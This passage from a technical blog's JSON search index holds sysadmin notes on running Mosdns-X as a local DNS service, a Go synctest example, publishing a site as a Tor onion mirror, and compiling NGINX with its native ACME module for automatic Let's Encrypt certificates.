style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e[Service]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eType=simple\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eUser=root\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eGroup=root\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eExecStart=/usr/local/bin/mosdns-x start --as-service -d /usr/local/bin -c /etc/mosdns-x/config.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eRestart=always\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eRestartSec=5\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eStandardOutput=journal\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eStandardError=journal\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eSyslogIdentifier=mosdns\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e[Install]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eWantedBy=multi-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl daemon-reload\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl enable --now mosdns\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 备份系统 DNS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo cp -n /etc/resolv.conf /etc/resolv.conf.mosdns-backup\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 改为使用本地 Mosdns-X\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nameserver 127.0.0.1\\noptions edns0\u0026#34;\u003c/span\u003e | sudo tee /etc/resolv.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 若 53 端口被 systemd-resolved 占用，可禁用它\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl disable --now systemd-resolved 2\u0026gt;/dev/null \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 如果想顺便加锁（防止被 DHCP 修改），加上 chattr 一起执行：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nameserver 127.0.0.1\\n\u0026#34;\u003c/span\u003e \u0026gt; /etc/resolv.conf \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e chattr +i /etc/resolv.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看进程状态\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl status mosdns --no-pager\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 测试解析速度（第二次命中缓存更快）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edig +stats www.google.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edig +stats www.baidu.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看实时日志\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etail -f /var/log/mosdns-x/mosdns-x.log\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go","DNS","linux"],"title":"Mosdns-X"},{"categories":["URL","Go","sync","test"],"contents":" go-synctest func TestAfterFunc(t *testing.T) { synctest.Test(t, func(*testing.T) { ctx, cancel := context.WithCancel(context.Background()) called := false context.AfterFunc(ctx, func() { called = true }) synctest.Wait() // 等到所有 goroutine 都卡住 if called { t.Fatal(\u0026#34;AfterFunc 在 cancel 前就被呼叫\u0026#34;) } cancel() synctest.Wait() // 再等一次 if !called { t.Fatal(\u0026#34;AfterFunc 沒有在 cancel 後被呼叫\u0026#34;) } }) } ","date":"November 7, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20251107-go-synctest/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ganhua.wang/go-synctest\" target=\"_blank\" rel=\"noopener\"\u003ego-synctest\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTestAfterFunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etesting\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003esynctest\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTest\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etesting\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ecancel\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWithCancel\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBackground\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003ecalled\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAfterFunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() { \u003cspan style=\"color:#a6e22e\"\u003ecalled\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003esynctest\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWait\u003c/span\u003e() \u003cspan style=\"color:#75715e\"\u003e// 等到所有 goroutine 都卡住\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecalled\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;AfterFunc 在 cancel 前就被呼叫\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003ecancel\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003esynctest\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWait\u003c/span\u003e() \u003cspan style=\"color:#75715e\"\u003e// 再等一次\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e !\u003cspan style=\"color:#a6e22e\"\u003ecalled\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;AfterFunc 沒有在 cancel 後被呼叫\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go","sync","test"],"title":"go-synctest"},{"categories":["URL","Tor"],"contents":" onion-mirror Install Tor sudo apt update sudo apt install tor Configure Tor # Disable SOCKS proxy since we aren\u0026#39;t making outbound connections # through Tor SocksPort 0 # Make sure Tor runs as a daemon (i.e. in the background) RunAsDaemon 1 # Setup the hidden service on port 80, this is where we tell Tor to # create a .onion service for our web server HiddenServiceDir /var/lib/tor/hidden_service/ HiddenServicePort 80 # Disable inbound connections, since we aren\u0026#39;t running a relay or # exit node ORPort 0 # Disable directory services, since we won\u0026#39;t be mirroring directory # information to other Tor nodes DirPort 0 sudo systemctl restart tor Get Your .onion Address sudo cat /var/lib/tor/hidden_service/hostname Configure Caddy http://jytkco7clxwj4hhzaydhk4kr3hwzsdzyvtsc6zn2ivog5uma5pxowzad.onion:80 { # Set up a reverse proxy, or serve static files, etc. } Advertise Your .onion Address header { Onion-Location http://jytkco7clxwj4hhzaydhk4kr3hwzsdzyvtsc6zn2ivog5uma5pxowzad.onion{uri} } ","date":"October 30, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20251030-onion-mirror/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://flower.codes/2025/10/23/onion-mirror.html\" target=\"_blank\" rel=\"noopener\"\u003eonion-mirror\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"install-tor\"\u003eInstall Tor\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt install tor\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"configure-tor\"\u003eConfigure Tor\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# Disable SOCKS proxy since we aren\u0026#39;t making outbound connections\n# through Tor\nSocksPort 0\n\n# Make sure Tor runs as a daemon (i.e. in the background)\nRunAsDaemon 1\n\n# Setup the hidden service on port 80, this is where we tell Tor to\n# create a .onion service for our web server\nHiddenServiceDir /var/lib/tor/hidden_service/\nHiddenServicePort 80\n\n# Disable inbound connections, since we aren\u0026#39;t running a relay or\n# exit node\nORPort 0\n\n# Disable directory services, since we won\u0026#39;t be mirroring directory\n# information to other Tor nodes\nDirPort 0\n\u003c/code\u003e\u003c/pre\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl restart tor\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"get-your-onion-address\"\u003eGet Your .onion Address\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo cat /var/lib/tor/hidden_service/hostname\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"configure-caddy\"\u003eConfigure Caddy\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttp://jytkco7clxwj4hhzaydhk4kr3hwzsdzyvtsc6zn2ivog5uma5pxowzad.onion:80 {\n  # Set up a reverse proxy, or serve static files, etc.\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"advertise-your-onion-address\"\u003eAdvertise Your .onion Address\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eheader {\n  Onion-Location http://jytkco7clxwj4hhzaydhk4kr3hwzsdzyvtsc6zn2ivog5uma5pxowzad.onion{uri}\n}\n\u003c/code\u003e\u003c/pre\u003e","tags":["URL","Tor"],"title":"onion-mirror"},{"categories":["URL","NGINX","ACME","module"],"contents":" NGINX 原生 ACME 支持：从根本上重塑 TLS 自动化部署 ngx_http_acme_module NGINX 1.25.1 pre-install # 在 Debian/Ubuntu 系统上安装基础编译工具和 NGINX 依赖 sudo apt update sudo apt install build-essential libpcre3-dev zlib1g-dev libssl-dev pkg-config libclang-dev git -y # 安装 Rust 工具链 (cargo 和 rustc) curl --proto \u0026#39;=https\u0026#39; --tlsv1.2 -sSf https://sh.rustup.rs | sh source $HOME/.cargo/env mkdir -pv /app/nginx/{logs,conf,cache, acme} /app/nginx-build cd /app/nginx-build # 克隆 ACME 模块的源码 git clone https://github.com/nginx/nginx-acme.git /app/nginx-build/nginx-acme # 或者 # git clone git@github.com:nginx/nginx-acme.git /app/nginx-build/nginx-acme # 下载 NGINX 源码（请替换为您需要的版本） wget https://nginx.org/download/nginx-1.28.0.tar.gz tar -zxf nginx-1.28.0.tar.gz compile cd nginx-1.28.0 ./configure \\ --prefix=/app/nginx \\ --error-log-path=/app/nginx/error.log \\ --http-log-path=/app/nginx/access.log \\ --pid-path=/app/nginx/nginx.pid \\ --lock-path=/app/nginx/nginx.lock \\ --http-client-body-temp-path=/app/nginx/cache/client_temp \\ --http-proxy-temp-path=/app/nginx/cache/proxy_temp \\ --http-fastcgi-temp-path=/app/nginx/cache/fastcgi_temp \\ --http-uwsgi-temp-path=/app/nginx/cache/uwsgi_temp \\ --http-scgi-temp-path=/app/nginx/cache/scgi_temp \\ --user=nginx \\ --group=nginx \\ --with-compat \\ --with-file-aio \\ --with-threads \\ --with-http_addition_module \\ --with-http_auth_request_module \\ --with-http_dav_module \\ --with-http_flv_module \\ --with-http_gunzip_module \\ --with-http_gzip_static_module \\ --with-http_mp4_module \\ --with-http_random_index_module \\ --with-http_realip_module \\ --with-http_secure_link_module \\ --with-http_slice_module \\ --with-http_ssl_module \\ --with-http_stub_status_module \\ --with-http_sub_module \\ --with-http_v2_module \\ --with-http_v3_module \\ --with-mail \\ --with-mail_ssl_module \\ --with-stream \\ --with-stream_realip_module \\ --with-stream_ssl_module \\ --with-stream_ssl_preread_module \\ --with-cc-opt=\u0026#39;-g -O2 -ffile-prefix-map=/home/builder/debuild/nginx-1.28.0/debian/debuild-base/nginx-1.28.0=. -fstack-protector-strong -Wformat -Werror=format-security -Wp,-D_FORTIFY_SOURCE=2 -fPIC\u0026#39; \\ --with-ld-opt=\u0026#39;-Wl,-z,relro -Wl,-z,now -Wl,--as-needed -pie\u0026#39; \\ --add-dynamic-module=/app/nginx-build/nginx-acme make \u0026amp;\u0026amp; \\ make modules \u0026amp;\u0026amp; \\ make install # 运行配置脚本，这里的关键是 --add-dynamic-module # 注意：您需要在这里包含您当前 NGINX 已有的所有编译参数，可以通过 nginx -V 查看 # 编译模块，注意是 make modules 而不是 make install config # /app/nginx/conf/nginx.conf user nginx; error_log error.log debug; pid nginx.pid; load_module modules/ngx_http_acme_module.so; events { worker_connections 1024; multi_accept on; } http { include mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$host\u0026#34; \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log access.log main; sendfile on; tcp_nopush on; charset utf-8; keepalive_timeout 65; gzip on; resolver 8.8.8.8 1.1.1.1; # 定义一个名为 letsencrypt 的 ACME 颁发机构实例 acme_issuer letsencrypt { # 指定 ACME 服务提供商的目录 URL，这里是 Let\u0026#39;s Encrypt 的生产环境 uri https://acme-v02.api.letsencrypt.org/directory; # 提供一个联系邮箱，用于接收 CA 的重要通知（如证书即将过期） contact mailto:security-alerts@aidig.co; # 指定状态文件的存储路径，用于保存 ACME 账户密钥，非常重要 state_path acme/letsencrypt; # 同意服务条款，对于 Let\u0026#39;s Encrypt 等 CA 这是必需的步骤 accept_terms_of_service; } # 可选指令 acme_shared_zone，用于存储所有配置的证书颁发者的证书、私钥和挑战数据。该区域默认大小为 256K，可根据需要增加 acme_shared_zone zone=acme_shared:1M; server { listen 443 ssl; server_name ssl.aidig.co; # 步骤一：声明此 server 块启用 ACME，并指定使用上面定义的 letsencrypt 颁发机构 acme_certificate letsencrypt; # 步骤二：使用动态变量加载由 ACME 模块在内存中管理的证书和私钥 ssl_certificate $acme_certificate; ssl_certificate_key $acme_certificate_key; ssl_certificate_cache max=2; # required ngx 1.27.4+ location / { default_type text/plain; return 200 \u0026#39;OK\u0026#39;; } } server { listen 80 default_server; server_name _; # ACME 模块会自动处理 /.well-known/acme-challenge/ 的请求，此 location 用于处理所有其他请求 location / { return 301 https://$host$request_uri; } } } ","date":"October 20, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20251020-nginx-acme-module/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sconts.com/post/nginx-native-acme-support/\" target=\"_blank\" rel=\"noopener\"\u003eNGINX 原生 ACME 支持：从根本上重塑 TLS 自动化部署\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ngx_http_acme_module\"\u003e\u003ccode\u003engx_http_acme_module\u003c/code\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eNGINX 1.25.1\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"pre-install\"\u003epre-install\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 在 Debian/Ubuntu 系统上安装基础编译工具和 NGINX 依赖\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt install build-essential libpcre3-dev zlib1g-dev libssl-dev pkg-config libclang-dev git -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 安装 Rust 工具链 (cargo 和 rustc)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl --proto \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;=https\u0026#39;\u003c/span\u003e --tlsv1.2 -sSf https://sh.rustup.rs | sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esource $HOME/.cargo/env\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir -pv /app/nginx/\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003elogs,conf,cache, acme\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e /app/nginx-build\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd /app/nginx-build\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 克隆 ACME 模块的源码\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit clone https://github.com/nginx/nginx-acme.git /app/nginx-build/nginx-acme\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 或者\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# git clone git@github.com:nginx/nginx-acme.git /app/nginx-build/nginx-acme\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 下载 NGINX 源码（请替换为您需要的版本）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewget https://nginx.org/download/nginx-1.28.0.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etar -zxf nginx-1.28.0.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"compile\"\u003ecompile\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd nginx-1.28.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./configure \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --prefix\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --error-log-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/error.log \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --http-log-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/access.log \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --pid-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/nginx.pid \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e    --lock-path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/app/nginx/nginx.lock \u003cspan 